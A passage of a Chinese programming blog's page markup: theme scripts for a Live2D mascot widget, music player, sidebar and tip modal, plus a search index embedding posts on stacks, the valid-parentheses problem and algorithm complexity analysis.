						return
					} else {
						$('#live_statu_val').val("0");
						$('.live_talk_input_body').fadeOut(500);
						AITalkFlag = false;
						showHitokoto();
						$('#showTalkBtn').show();
						$('#showInfoBtn').hide();
					}
				});
				$('#showTalkBtn').on('click', function () {
					var live_statu = $('#live_statu_val').val();
					if (live_statu == "1") {
						return
					} else {
						$('#live_statu_val').val("1");
						$('.live_talk_input_body').fadeIn(500);
						AITalkFlag = true;
						$('#showTalkBtn').hide();
						$('#showInfoBtn').show();

					}
				});
				$('#talk_send').on('click', function () {
					var info_ = $('#AIuserText').val();
					var userid_ = $('#AIuserName').val();
					if (info_ == "") {
						showMessage('写点什么吧！', 0);
						return;
					}
					if (userid_ == "") {
						showMessage('聊之前请告诉我你的名字吧！', 0);
						return;
					}
					showMessage('思考中~', 0);
					let protocol = window.location.protocol.indexOf("s") > 0 ? "https" : "http";
					$.ajax({
						type: "get",
						url: `${protocol}://www.tuling123.com/openapi/api?key=${apiKey}&info=${info_}`,
						dataType: "json",
						success: function (res) {
							talkValTimer();
							showMessage(res.text, 0);
							$('#AIuserText').val("");
							sessionStorage.setItem("live2duser", userid_);
						},
						error: function (e) {
							talkValTimer();
							showMessage('似乎有什么错误，请和站长联系！', 0);
						}
					});
				});
			} else {
				$('#showInfoBtn').hide();
				$('#showTalkBtn').hide();
			}
			//获取音乐信息初始化
			var bgmListInfo = $('input[name=live2dBGM]');
			if (bgmListInfo.length == 0) {
				$('#musicButton').hide();
			} else {
				var bgmPlayNow = parseInt($('#live2d_bgm').attr('data-bgm'));
				var bgmPlayTime = 0;
				var live2dBGM_Num = sessionStorage.getItem("live2dBGM_Num");
				var live2dBGM_PlayTime = sessionStorage.getItem("live2dBGM_PlayTime");
				if (live2dBGM_Num) {
					if (live2dBGM_Num <= $('input[name=live2dBGM]').length - 1) {
						bgmPlayNow = parseInt(live2dBGM_Num);
					}
				}
				if (live2dBGM_PlayTime) {
					bgmPlayTime = parseInt(live2dBGM_PlayTime);
				}
				var live2dBGMSrc = bgmListInfo.eq(bgmPlayNow).val();
				$('#live2d_bgm').attr('data-bgm', bgmPlayNow);
				$('#live2d_bgm').attr('src', live2dBGMSrc);
				$('#live2d_bgm')[0].currentTime = bgmPlayTime;
				$('#live2d_bgm')[0].volume = 0.5;
				var live2dBGM_IsPlay = sessionStorage.getItem("live2dBGM_IsPlay");
				var live2dBGM_WindowClose = sessionStorage.getItem("live2dBGM_WindowClose");
				if (live2dBGM_IsPlay == '0' && live2dBGM_WindowClose == '0') {
					$('#live2d_bgm')[0].play();
					$('#musicButton').addClass('play');
				}
				sessionStorage.setItem("live2dBGM_WindowClose", '1');
				$('#musicButton').on('click', function () {
					if ($('#musicButton').hasClass('play')) {
						$('#live2d_bgm')[0].pause();
						$('#musicButton').removeClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '1');
					} else {
						$('#live2d_bgm')[0].play();
						$('#musicButton').addClass('play');
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				});
				window.onbeforeunload = function () {
					sessionStorage.setItem("live2dBGM_WindowClose", '0');
					if ($('#musicButton').hasClass('play')) {
						sessionStorage.setItem("live2dBGM_IsPlay", '0');
					}
				}
				document.getElementById('live2d_bgm').addEventListener("timeupdate", function () {
					var live2dBgmPlayTimeNow = document.getElementById('live2d_bgm').currentTime;
					sessionStorage.setItem("live2dBGM_PlayTime", live2dBgmPlayTimeNow);
				});
				document.getElementById('live2d_bgm').addEventListener("ended", function () {
					var listNow = parseInt($('#live2d_bgm').attr('data-bgm'));
					listNow++;
					if (listNow > $('input[name=live2dBGM]').length - 1) {
						listNow = 0;
					}
					var listNewSrc = $('input[name=live2dBGM]').eq(listNow).val();
					sessionStorage.setItem("live2dBGM_Num", listNow);
					$('#live2d_bgm').attr('src', listNewSrc);
					$('#live2d_bgm')[0].play();
					$('#live2d_bgm').attr('data-bgm', listNow);
				});
				document.getElementById('live2d_bgm').addEventListener("error", function () {
					$('#live2d_bgm')[0].pause();
					$('#musicButton').removeClass('play');
					showMessage('音乐似乎加载不出来了呢！', 0);
				});
			}
			//获取用户名
			var live2dUser = sessionStorage.getItem("live2duser");
			if (live2dUser !== null) {
				$('#AIuserName').val(live2dUser);
			}
			//获取位置
			var landL = sessionStorage.getItem("historywidth");
			var landB = sessionStorage.getItem("historyheight");
			if (landL == null || landB == null) {
				landL = '5px'
				landB = '0px'
			}
			$('#landlord').css('left', landL + 'px');
			$('#landlord').css('bottom', landB + 'px');
			//移动
			function getEvent() {
				return window.event || arguments.callee.caller.arguments[0];
			}
			var smcc = document.getElementById("landlord");
			var moveX = 0;
			var moveY = 0;
			var moveBottom = 0;
			var moveLeft = 0;
			var moveable = false;
			var docMouseMoveEvent = document.onmousemove;
			var docMouseUpEvent = document.onmouseup;
			smcc.onmousedown = function () {
				var ent = getEvent();
				moveable = true;
				moveX = ent.clientX;
				moveY = ent.clientY;
				var obj = smcc;
				moveBottom = parseInt(obj.style.bottom);
				moveLeft = parseInt(obj.style.left);
				if (isFirefox = navigator.userAgent.indexOf("Firefox") > 0) {
					window.getSelection().removeAllRanges();
				}
				document.onmousemove = function () {
					if (moveable) {
						var ent = getEvent();
						var x = moveLeft + ent.clientX - moveX;
						var y = moveBottom + (moveY - ent.clientY);
						obj.style.left = x + "px";
						obj.style.bottom = y + "px";
					}
				};
				document.onmouseup = function () {
					if (moveable) {
						var historywidth = obj.style.left;
						var historyheight = obj.style.bottom;
						historywidth = historywidth.replace('px', '');
						historyheight = historyheight.replace('px', '');
						sessionStorage.setItem("historywidth", historywidth);
						sessionStorage.setItem("historyheight", historyheight);
						document.onmousemove = docMouseMoveEvent;
						document.onmouseup = docMouseUpEvent;
						moveable = false;
						moveX = 0;
						moveY = 0;
						moveBottom = 0;
						moveLeft = 0;
					}
				};
			};
		}
		$(document).ready(function () {
			var AIimgSrc = [];
			let chooseLive2d = 'aoba'
			if (chooseLive2d === 'histoire') {
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_00.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_01.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_02.png");
				AIimgSrc.push(message_Path + "model/histoire/histoire.1024/texture_03.png");
			} else if (chooseLive2d === 'rem') {
				AIimgSrc.push(message_Path + "model/rem/remu2048/texture_00.png");
			} else if (chooseLive2d === 'aoba') {
				AIimgSrc.push(message_Path + "model/aoba/textures/texture_00.png");
			} else if (chooseLive2d === 'hijiki') {
				AIimgSrc.push(message_Path + "model/hijiki/moc/hijiki.2048/texture_00.png");
			} else if (chooseLive2d === 'tororo') {
				AIimgSrc.push(message_Path + "model/tororo/moc/tororo.2048/texture_00.png");
			}
			var images = [];
			var imgLength = AIimgSrc.length;
			var loadingNum = 0;
			for (var i = 0; i < imgLength; i++) {
				images[i] = new Image();
				images[i].src = AIimgSrc[i];
				images[i].onload = function () {
					loadingNum++;
					if (loadingNum === imgLength) {
						var live2dhidden = localStorage.getItem("live2dhidden");
						if (live2dhidden === "0") {
							setTimeout(function () {
								$('#open_live2d').fadeIn(200);
							}, 1300);
						} else {
							setTimeout(function () {
								$('#landlord').fadeIn(200);
							}, 1300);
						}
						let model = '';
						if (chooseLive2d === 'histoire') {
							model = message_Path + "model/histoire/model.json";
						} else if (chooseLive2d === 'rem') {
							model = message_Path + "model/rem/model.json";
						} else if (chooseLive2d === 'aoba') {
							model = message_Path + "model/aoba/model.json";
						} else if (chooseLive2d === 'hijiki') {
							model = message_Path + "model/hijiki/hijiki.model.json";
						} else if (chooseLive2d === 'tororo') {
							model = message_Path + "model/tororo/tororo.model.json";
						}
						setTimeout(function () {
							loadlive2d("live2d", model);
						}, 1000);
						initLive2d();
						images = null;
					}
				}
			}
		});
	}
</script>
  
  
</div>
<script>

  let sideBarOpen = 'sidebar-open';
  let body = document.body;
  let back2Top = document.querySelector('#back_to_top'),
    back2TopText = document.querySelector('#back_to_top_text'),
    drawerBox = document.querySelector('#drawer_box'),
    rightSideBar = document.querySelector('.sidebar'),
    viewport = document.querySelector('body');

  function scrollAnimation(currentY, targetY) {

    let needScrollTop = targetY - currentY
    let _currentY = currentY
    setTimeout(() => {
      const dist = Math.ceil(needScrollTop / 10)
      _currentY += dist
      window.scrollTo(_currentY, currentY)
      if (needScrollTop > 10 || needScrollTop < -10) {
        scrollAnimation(_currentY, targetY)
      } else {
        window.scrollTo(_currentY, targetY)
      }
    }, 1)
  }

  back2Top.addEventListener("click", function (e) {
    scrollAnimation(document.scrollingElement.scrollTop, 0);
    e.stopPropagation();
    return false;
  });

  window.addEventListener('scroll', function (e) {
    let percent = document.scrollingElement.scrollTop / (document.scrollingElement.scrollHeight - document.scrollingElement.clientHeight) * 100;
    if (percent > 1 && !back2Top.classList.contains('back-top-active')) {
      back2Top.classList.add('back-top-active');
    }
    if (percent == 0) {
      back2Top.classList.remove('back-top-active');
    }
    if (back2TopText) {
      back2TopText.textContent = Math.floor(percent);
    }
  });


  let hasCacu = false;
  window.addEventListener('resize', function (e) {
    calcuHeight();
  });

  function calcuHeight() {
    // 动态调整站点概览高度
    if (!hasCacu && back2Top.classList.contains('pisces') || back2Top.classList.contains('gemini')) {
      let sideBar = document.querySelector('.sidebar');
      let navUl = document.querySelector('#site_nav');
      sideBar.style = 'margin-top:' + (navUl.offsetHeight + navUl.offsetTop + 15) + 'px;';
      hasCacu = true;
    }
  }
  calcuHeight();

  let open = false, MOTION_TIME = 300, RIGHT_MOVE_DIS = '320px';

  if (drawerBox) {
    let rightMotions = document.querySelectorAll('.right-motion');
    let right = drawerBox.classList.contains('right');

    let transitionDir = right ? "transition.slideRightIn" : "transition.slideLeftIn";

    let openProp, closeProp;
    if (right) {
      openProp = {
        paddingRight: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingRight: '0px'
      };
    } else {
      openProp = {
        paddingLeft: RIGHT_MOVE_DIS
      };
      closeProp = {
        paddingLeft: '0px'
      };
    }

    drawerBox.onclick = function () {
      open = !open;
      jQuery.Velocity(rightSideBar, 'stop');
      jQuery.Velocity(viewport, 'stop');
      jQuery.Velocity(rightMotions, 'stop');
      if (open) {
        jQuery.Velocity(rightSideBar, {
          width: RIGHT_MOVE_DIS
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, transitionDir, {});
          }
        })
        jQuery.Velocity(viewport, openProp, {
          duration: MOTION_TIME
        });
      } else {
        jQuery.Velocity(rightSideBar, {
          width: '0px'
        }, {
          duration: MOTION_TIME,
          begin: function () {
            jQuery.Velocity(rightMotions, {
              opacity: 0
            });
          }
        })
        jQuery.Velocity(viewport, closeProp, {
          duration: MOTION_TIME
        });
      }
      for (let i = 0; i < drawerBox.children.length; i++) {
        drawerBox.children[i].classList.toggle('muse-line');
      }
      drawerBox.classList.toggle(sideBarOpen);
    }
  }

  // 链接跳转
  let newWindow = 'false'
  if (newWindow === 'true') {
    let links = document.querySelectorAll('.post-body a')
    links.forEach(item => {
      if (!item.classList.contains('btn')) {
        item.setAttribute("target", "_blank");
      }
    })
  }

  let faSearch = document.querySelector('#fa_search');
  faSearch && faSearch.addEventListener('click', function () {
    document.querySelector('#search_mask').style = ''
  })

  // 代码高亮
  hljs.initHighlightingOnLoad();
  
  // 离开当前页title变化
  var leaveTitle = "";
  var normal_title = document.title;
  if (leaveTitle) {
    document.addEventListener('visibilitychange', function () {
      if (document.visibilityState == 'hidden') {
        normal_title = document.title;
        document.title = leaveTitle;
      } else {
        document.title = normal_title;
      }
    });
  }

</script>

<link rel="stylesheet" href="/media/css/jquery.fancybox.css" />
<script src="/media/js/jquery.fancybox.js"></script>

<script>
  let images = document.querySelectorAll('.section img');
  images.forEach(image => {
    var parent = image.parentElement;
    var next = image.nextElementSibling;
    parent.removeChild(image);
    var aelem = document.createElement('a');
    aelem.href = image.src;
    aelem.dataset['fancybox'] = 'images';
    aelem.dataset['rel'] = 'fancybox-button';
    aelem.classList.add('fancybox');
    aelem.appendChild(image);
    parent.insertBefore(aelem, next);
  })
</script>

    <div class="reward-mask" style="display: none;">
  <div class="reward-relative">
    <span class="close" aria-hidden="true">x</span>
    <div class="reward-body">
      <h2>感谢您的支持，我会继续努力的!</h2>
      <div class="reward-img-box">
        <div style="position: relative; width: 140px; height: 140px;">
          
          
          
        </div>
      </div>
      <p class="reward-word">扫码打赏，你说多少就多少</p>
      <p class="reward-tip">打开微信扫一扫，即可进行扫码打赏哦</p>
    </div>
    <div class="bottom">
      
      
    </div>
  </div>
</div>
<style>
  .reward-mask {
    position: fixed;
    z-index: 99999;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    background-color: #00000054;
  }

  .reward-relative {
    position: relative;
    width: 480px;
    text-align: center;
    margin: 0 auto;
    border-radius: 5px;
    background-color: #fff;
    top: 50%;
    margin-top: -205px;
  }

  .reward-relative .close {
    position: absolute;
    right: 10px;
    font-weight: normal;
    font-size: 16px;
    color: #929292;
  }

  .reward-body {
    padding: 40px 20px 20px;
  }

  .bottom {
    display: flex;
  }

  .reward-btn {
    text-align: center;
  }

  .reward-btn-text {
    display: inline-block;
    cursor: pointer;
    width: 60px;
    height: 60px;
    line-height: 60px;
    border-radius: 50%;
    background-color: #ff9734;
    color: #FFF;
    margin-top: 20px;
  }

  .pay-text {
    margin-top: 10px;
    padding: 10px;
    flex: 1;
    transition: all .2s linear;
  }

  .pay-text:hover {
    background-color: #a5a5a536;
  }

  .reward-body h2 {
    padding-top: 10px;
    text-align: center;
    color: #a3a3a3;
    font-size: 16px;
    font-weight: normal;
    margin: 0 0 20px;
  }

  .reward-body h2:after,
  .reward-body h2:before {
    font-family: Arial, Helvetica, sans-serif;
    background: 0 0;
    width: 0;
    height: 0;
    font-style: normal;
    color: #eee;
    font-size: 80px;
    position: absolute;
    top: 20px;
  }

  .reward-body h2:before {
    content: '\201c';
    left: 50px;
  }

  .reward-body h2:after {
    content: '\201d';
    right: 80px;
  }

  .reward-img-box {
    display: inline-block;
    padding: 10px;
    border: 6px solid #ea5f00;
    margin: 0 auto;
    border-radius: 3px;
    position: relative;
  }

  .reward-img {
    position: absolute;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
  }

  @media (max-width: 767px) {
    .reward-relative {
      height: 100%;
      top: 0px;
      margin-top: 0;
      width: auto;
    }

    .reward-relative .bottom {
      flex-direction: column;
    }

    .reward-relative .pay-text {
      width: 80%;
      margin: 5px auto;
      border: 1px solid silver;
      padding: 6px;
      border-radius: 4px;
    }

    .reward-body h2:after {
      right: 40px;
    }

    .reward-body h2:after,
    .reward-body h2:before {
      font-size: 60px;
    }

    .reward-body h2:before {
      left: 20px;
    }
  }
</style>
<script>
  !function () {
    var mask = document.querySelector('.reward-mask');
    let close = document.querySelector('.reward-relative .close');
    let rewardBtn = document.querySelector('.reward-btn');

    let zfb = document.querySelector('#zfb'),
      wx = document.querySelector('#wx'),
      zfbBtn = document.querySelector('#zfbBtn'),
      wxBtn = document.querySelector('#wxBtn');

    if (zfbBtn && wxBtn) {
      zfbBtn.addEventListener('click', () => {
        jQuery.Velocity(zfb, 'transition.slideLeftIn', {
          duration: 400
        });
        jQuery.Velocity(wx, 'transition.slideRightOut', {
          display: 'none',
          duration: 400
        });
      });

      wxBtn.addEventListener('click', () => {
        jQuery.Velocity(wx, 'transition.slideRightIn', {
          duration: 400
        });
        jQuery.Velocity(zfb, 'transition.slideLeftOut', {
          display: 'none',
          duration: 400
        });
      });
    }

    rewardBtn.addEventListener('click', (e) => {
      jQuery.Velocity(mask, 'transition.slideDownIn', {
        duration: 400
      })
    });

    close.addEventListener('click', (e) => {
      e.preventDefault();
      jQuery.Velocity(mask, 'transition.slideUpOut', {
        duration: 400
      })
    })
  }()
</script>

  </div>
</body>

<div class="search-mask" id="search_mask" style="display: none;">
  <div class="search-box">
    <div class="search-title">
      <i class="fa fa-search"></i>
      <div class="input-box">
        <input id="search" type="text" class="language" data-lan="search" placeholder="搜索">
      </div>
      <i id="close" class="fa fa-times-circle"></i>
    </div>
    <div class="stat-box">
      <span id="stat_count">0</span><span class="language" data-lan="stat">条相关条目，使用了</span><span id="stat_times">0</span><span class="language" data-lan="stat-time">毫秒</span>
      <hr>
    </div>
    <div class="result" id="result">
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/algorithm-stack-20-you-xiao-de-gua-hao/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;给定一个只包括 &#39;(&#39;，&#39;)&#39;，&#39;{&#39;，&#39;}&#39;，&#39;[&#39;，&#39;]&#39; 的字符串 s ，判断字符串是否有效。&lt;/p&gt;
&lt;p&gt;有效字符串需满足：&lt;/p&gt;
&lt;p&gt;左括号必须用相同类型的右括号闭合。&lt;br&gt;
左括号必须以正确的顺序闭合。&lt;/p&gt;
&lt;h2 id=&#34;测试&#34;&gt;测试&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;输入：s = &amp;quot;()&amp;quot;
输出：true

输入：s = &amp;quot;()[]{}&amp;quot;
输出：true

输入：s = &amp;quot;(]&amp;quot;
输出：false

输入：s = &amp;quot;([)]&amp;quot;
输出：false

输入：s = &amp;quot;{[]}&amp;quot;
输出：true
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;解题思路&#34;&gt;解题思路&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;{[()]}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;1、需要遍历所有字符串&lt;/p&gt;
&lt;p&gt;2、遇到左括号先略过，遇到右括号开始匹配，匹配的是最后遇到的左括号&lt;/p&gt;
&lt;p&gt;3、&lt;strong&gt;后进先出&lt;/strong&gt;模式，左括号逐一入栈，若遇到右括号，则取栈顶元素左括号&lt;/p&gt;
&lt;h2 id=&#34;解题步骤&#34;&gt;解题步骤&lt;/h2&gt;
&lt;p&gt;1、新建一个栈&lt;br&gt;
2、扫描字符串，遇左括号入栈，遇到和栈顶括号类型匹配的右括号就出栈，类型不匹配直接判定为不合法&lt;br&gt;
3、最后栈空了就合法，否则不合法&lt;/p&gt;
&lt;h2 id=&#34;代码&#34;&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;/**
 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
  if (s.length % 2 === 1) {
    return false
  }
  const stack = []
  for (const value of s) {
    if (value === &#39;(&#39; || value === &#39;[&#39; || value === &#39;{&#39;) {
      stack.push(value)
    }else {
      const stack_top = stack[stack.length-1]
      if (
        (stack_top === &#39;(&#39; &amp;amp;&amp;amp; value === &#39;)&#39;) ||
        (stack_top === &#39;[&#39; &amp;amp;&amp;amp; value === &#39;]&#39;) ||
        (stack_top === &#39;{&#39; &amp;amp;&amp;amp; value === &#39;}&#39;)
      ) {
        stack.pop()
      }else {
        return false
      }
    }
  }
  return stack.length === 0
};
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var isValid = function(s) {
  const length = s.length
  if (length % 2 === 1) {
    return false
  }
  const stack = []
  let index = -1
  while (++index &amp;lt; length) {
    const value = s[index]
    if (value === &#39;(&#39; || value === &#39;[&#39; || value === &#39;{&#39;) {
      stack.push(value)
    }else {
      const stack_top = stack[stack.length-1]
      if (
        (stack_top === &#39;(&#39; &amp;amp;&amp;amp; value === &#39;)&#39;) ||
        (stack_top === &#39;[&#39; &amp;amp;&amp;amp; value === &#39;]&#39;) ||
        (stack_top === &#39;{&#39; &amp;amp;&amp;amp; value === &#39;}&#39;)
      ) {
        stack.pop()
      }else {
        return false
      }
    }
  }  
  return stack.length === 0
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;复杂度&#34;&gt;复杂度&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;时间复杂度：O(n)，其中 n是字符串 s 的长度。&lt;/li&gt;
&lt;li&gt;空间复杂度：O(n)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;1、栈适合解决对称类问题&lt;/p&gt;
&lt;p&gt;2、先分析不合理情况，若存在，则提前返回&lt;/p&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://programmercarl.com/0020.%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7.html&#34;&gt;代码随想录&lt;/a&gt;&lt;/p&gt;
">128-data_structure-2-stack20有效的括号</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/algorithm-stack-zhan/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;一种后进先出的数据结构；&lt;/p&gt;
&lt;p&gt;「蜂窝煤换煤过程」&lt;/p&gt;
&lt;h2 id=&#34;使用数组模拟&#34;&gt;使用数组模拟&lt;/h2&gt;
&lt;p&gt;JavaScript没有栈的结构；可以用array实现栈的功能&lt;/p&gt;
&lt;p&gt;push 入栈&lt;br&gt;
pop 出栈&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;const stack = [];
stack.push(1);
stack.push(2);
const item1 = stack.pop();
const item2 = stack.pop();
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;使用场景&#34;&gt;使用场景&lt;/h2&gt;
&lt;p&gt;需要后进先出的场景。&lt;/p&gt;
&lt;p&gt;1、十进制转换为二进制：最后余数要倒叙输出才是正确二进制；&lt;/p&gt;
&lt;p&gt;2、判断括号是否合法：左括号进栈，右括号出栈，栈空则合法；&lt;/p&gt;
&lt;p&gt;3、函数调用栈：最后调用的函数，最先执行完；&lt;/p&gt;
">127-data_structure-1-stack栈简介</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/algorithm-shi-jian-he-kong-jian-fu-za-du-fen-xi/"" data-c="
          &lt;h2 id=&#34;释义&#34;&gt;释义&lt;/h2&gt;
&lt;p&gt;1.数据结构和算法解决是“如何让计算机更快时间、更省空间的解决问题”。&lt;br&gt;
2.因此需从执行时间和占用空间两个维度来评估数据结构和算法的性能。&lt;br&gt;
3.分别用时间复杂度和空间复杂度两个概念来描述性能问题，二者统称为复杂度。&lt;br&gt;
4.复杂度描述的是算法执行时间（或占用空间）与数据规模的增长关系。&lt;/p&gt;
&lt;p&gt;时间、空间复杂度分析：粗略地估计算法的执行效率的方法，算法的执行效率就是算法代码执行的时间&lt;/p&gt;
&lt;h2 id=&#34;原因&#34;&gt;原因&lt;/h2&gt;
&lt;p&gt;1.和性能测试相比，复杂度分析有不依赖执行环境、成本低、效率高、易操作、指导性强的特点。&lt;br&gt;
2.掌握复杂度分析，将能编写出性能更优的代码，有利于降低系统开发和维护成本。&lt;/p&gt;
&lt;h2 id=&#34;复杂度分析&#34;&gt;复杂度分析&lt;/h2&gt;
&lt;h3 id=&#34;大o表示法&#34;&gt;大O表示法&lt;/h3&gt;
&lt;h4 id=&#34;1-来源&#34;&gt;1、来源&lt;/h4&gt;
&lt;p&gt;算法的执行时间与每行代码的执行次数成正比，用T(n) = O(f(n))表示，其中T(n)表示算法执行总时间，f(n)表示每行代码执行总次数，而n往往表示数据的规模。&lt;/p&gt;
&lt;h4 id=&#34;2-特点&#34;&gt;2、特点&lt;/h4&gt;
&lt;p&gt;以时间复杂度为例，由于时间复杂度描述的是算法执行时间与数据规模的增长变化趋势，所以常量阶、低阶以及系数实际上对这种增长趋势不产生决定性影响，所以在做时间复杂度分析时忽略这些项。&lt;/p&gt;
&lt;h3 id=&#34;复杂度分析法则&#34;&gt;复杂度分析法则&lt;/h3&gt;
&lt;p&gt;1）单段代码看高频：比如循环。&lt;br&gt;
2）多段代码取最大：比如一段代码中有单循环和多重循环，那么取多重循环的复杂度。&lt;br&gt;
3）嵌套代码求乘积：比如递归、多重循环等&lt;br&gt;
4）多个规模求加法：比如方法有两个参数控制两个循环的次数，那么这时就取二者复杂度相加。&lt;/p&gt;
&lt;h2 id=&#34;常用的复杂度级别&#34;&gt;常用的复杂度级别&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1631839153496.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;多项式阶：随着数据规模的增长，算法的执行时间和空间占用，按照多项式的比例增长。包括：&lt;br&gt;
O(1)（常数阶）、O(logn)（对数阶）、O(n)（线性阶）、O(nlogn)（线性对数阶）、O(n&lt;sup&gt;2&lt;/sup&gt;)（平方阶）、 O(n&lt;sup&gt;3&lt;/sup&gt;)（立方阶）&lt;br&gt;
非多项式阶：随着数据规模的增长，算法的执行时间和空间占用暴增，这类算法性能极差。包括：&lt;br&gt;
O(2&lt;sup&gt;n&lt;/sup&gt;)（指数阶）、O(n!)（阶乘阶）&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1631839161974.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;p&gt;假设每行代码执行的时间都一样，为 unit_time。&lt;br&gt;
1、O(n)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; int cal(int n) {
   int sum = 0; // 1
   int i = 1; // 1
   for (; i &amp;lt;= n; ++i) { // n
     sum = sum + i; // n
   }
   return sum;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所有代码的执行时间为&lt;code&gt;(2n+2)*unit_time&lt;/code&gt;&lt;br&gt;
&lt;code&gt;T(n) = O(2n+2)&lt;/code&gt;&lt;br&gt;
当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，用大 O 表示法表示，就可以记为：&lt;code&gt;T(n) = O(n)&lt;/code&gt;；&lt;br&gt;
2、O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; int cal(int n) {
   int sum = 0; // 1
   int i = 1;  // 1
   int j = 1; // 1
   for (; i &amp;lt;= n; ++i) { // n
     j = 1; // n
     for (; j &amp;lt;= n; ++j) { // n^2
       sum = sum +  i * j; // n^2
     }
   }
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;T(n) = (2n&lt;sup&gt;2&lt;/sup&gt;+2n+3)*unit_time, 即T(n) = O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;br&gt;
3、O(1)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; int i = 8;
 int j = 6;
 int sum = i + j;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;一般情况下，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)。&lt;br&gt;
4、O(logn)、O(nlogn)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; i=1;
 while (i &amp;lt;= n)  {
   i = i * 2;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从代码中可以看出，变量 i 的值从 1 开始取，每循环一次就乘以 2。当大于 n 时，循环结束。变量 i 的取值就是一个等比数列。通过 2&lt;sup&gt;x&lt;/sup&gt;=n 求解 x(执行次数)，x=log&lt;sub&gt;2&lt;/sub&gt;n。时间复杂度就是 O(log&lt;sub&gt;2&lt;/sub&gt;n)。&lt;/p&gt;
&lt;p&gt;log&lt;sub&gt;3&lt;/sub&gt;n 等于 log&lt;sub&gt;3&lt;/sub&gt;2 * log&lt;sub&gt;2&lt;/sub&gt;n，所以 O(log&lt;sub&gt;3&lt;/sub&gt;n) = O(C * log&lt;sub&gt;2&lt;/sub&gt;n)，其中 C=log&lt;sub&gt;3&lt;/sub&gt;2 是一个常量。在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))。所以，O(log&lt;sub&gt;2&lt;/sub&gt;n) 就等于 O(log&lt;sub&gt;3&lt;/sub&gt;n)。在对数阶时间复杂度的表示方法里，我们忽略对数的“底”，统一表示为 O(logn)。&lt;/p&gt;
&lt;p&gt;如果一段代码的时间复杂度为O(logn)，循环执行n遍后的时间复杂度就是O(nlogn)。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1&amp;gt; 只关注循环执行次数最多的一段代码&lt;br&gt;
O(n)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; int cal(int n) {
   int sum = 0;
   int i = 1;
   for (; i &amp;lt;= n; ++i) { // n
     sum = sum + i;
   }
   return sum;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2&amp;gt; 加法法则：总复杂度等于量级最大的那段代码的复杂度&lt;br&gt;
O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int cal(int n) {
   int sum_1 = 0;
   int p = 1;
   for (; p &amp;lt; 100; ++p) { // 100
     sum_1 = sum_1 + p;
   }

   int sum_2 = 0;
   int q = 1;
   for (; q &amp;lt; n; ++q) { // n
     sum_2 = sum_2 + q;
   }
 
   int sum_3 = 0;
   int i = 1;
   int j = 1;
   for (; i &amp;lt;= n; ++i) { // n^2
     j = 1; 
     for (; j &amp;lt;= n; ++j) {
       sum_3 = sum_3 +  i * j;
     }
   }
 
   return sum_1 + sum_2 + sum_3;
 }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;3&amp;gt; 乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积&lt;br&gt;
